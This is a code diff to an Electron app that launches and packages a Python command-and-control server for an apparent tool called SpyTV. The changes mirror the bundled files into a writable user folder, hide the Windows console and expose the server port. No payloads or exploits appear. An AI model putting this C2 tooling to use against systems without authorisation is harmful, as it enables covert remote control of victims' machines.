@@ -112,11 +112,14 @@ function spawnC2Server() {
   const fs = require('fs');
 
   // Resolve the repo root — in dev it's one level up from electron/,
-  // in a packaged exe the Python files are bundled via extraResources.
+  // in a packaged app the Python files are bundled via extraResources
+  // into resources/py next to process.resourcesPath.
+  const bundledPy = process.resourcesPath ? path.join(process.resourcesPath, 'py') : null;
   const candidates = [
-    path.resolve(__dirname, '..'),            // dev: electron/ → repo root
-    path.resolve(__dirname, '..', '..'),       // packaged: resources/ → repo root
-    process.cwd(),                            // fallback: current working dir
+    ...(bundledPy ? [bundledPy] : []),          // packaged: bundled Python app
+    path.resolve(__dirname, '..'),              // dev: electron/ → repo root
+    path.resolve(__dirname, '..', '..'),        // packaged: resources/ → repo root
+    process.cwd(),                              // fallback: current working dir
   ];
 
   let repoRoot = null;
@@ -128,7 +131,49 @@ function spawnC2Server() {
   }
   if (!repoRoot) repoRoot = path.resolve(__dirname, '..');
 
-  const pythonExe = process.env.SPYTV_PYTHON || 'python';
+  // Installed packages (.deb/.dmg) keep resources/ read-only, but the C2
+  // server writes its c2_data state relative to the working directory.
+  // Mirror the bundled Python app into a per-user dir so state stays writable.
+  let spawnCwd = repoRoot;
+  if (bundledPy && path.resolve(repoRoot) === path.resolve(bundledPy)) {
+    const userPy = path.join(app.getPath('userData'), 'py');
+    const markerFile = path.join(userPy, '.spytv-app-version');
+    // Mirror must refresh when EITHER the app version changed OR the bundled
+    // c2_server.py content changed — otherwise a same-version rebuild with
+    // edited Python silently runs stale code from the mirror (observed: the
+    // walkthrough endpoints existed in source but the packaged EXE 404'd them
+    // because the mirror predated the edit).
+    let sourceHash = '';
+    try {
+      const crypto = require('crypto');
+      for (const f of ['c2_server.py', 'c2_dashboard.html']) {
+        const src = path.join(bundledPy, f);
+        if (fs.existsSync(src)) {
+          sourceHash += crypto.createHash('sha256').update(fs.readFileSync(src)).digest('hex').slice(0, 16);
+        }
+      }
+    } catch (_) {}
+    const expectedMarker = app.getVersion() + '|' + sourceHash;
+    let marker = null;
+    try { marker = fs.readFileSync(markerFile, 'utf8'); } catch (_) {}
+    if (marker !== expectedMarker) {
+      try {
+        fs.rmSync(userPy, { recursive: true, force: true });
+        fs.cpSync(bundledPy, userPy, { recursive: true });
+        fs.writeFileSync(markerFile, expectedMarker);
+      } catch (err) {
+        console.error('Failed to mirror bundled Python app to userData:', err);
+      }
+    }
+    if (fs.existsSync(path.join(userPy, 'c2_server.py'))) {
+      repoRoot = userPy;
+      spawnCwd = userPy;
+    } else {
+      spawnCwd = app.getPath('userData');
+    }
+  }
+
+  const pythonExe = process.env.SPYTV_PYTHON || (process.platform === 'win32' ? 'python' : 'python3');
   const serverScript = path.join(repoRoot, 'c2_server.py');
 
   // Prefer venv python if available
@@ -139,8 +184,13 @@ function spawnC2Server() {
 
   try {
     const proc = spawn(pythonBin, args, {
-      cwd: repoRoot,
-      windowsHide: false,
+      cwd: spawnCwd,
+      // Hide the Python console window on Windows: the dashboard streams its
+      // output through the `server-output` IPC channel below, so a visible
+      // console is pure UX noise (and looked like a regression — see the
+      // "EXE opened a terminal" report). The server writes nothing critical
+      // solely to stdout.
+      windowsHide: true,
       env: { ...process.env, SPYTV_C2_PORT: process.env.SPYTV_C2_PORT || '9443' },
     });
 
@@ -236,6 +286,10 @@ ipcMain.handle('get-server-info', async () => ({
   electron: process.versions.electron,
   chrome: process.versions.chrome,
   app: app.getVersion(),
+  // The port the spawned C2 server is actually bound to. The dashboard iframe
+  // in index.html used to hardcode 8443 while the spawned server defaulted to
+  // 9443 — the fix is to surface the real port here so the renderer can ask.
+  c2Port: process.env.SPYTV_C2_PORT || SPYTV_C2_PORT_DEFAULT,
 }));
 
 ipcMain.handle('restart-server', () => {
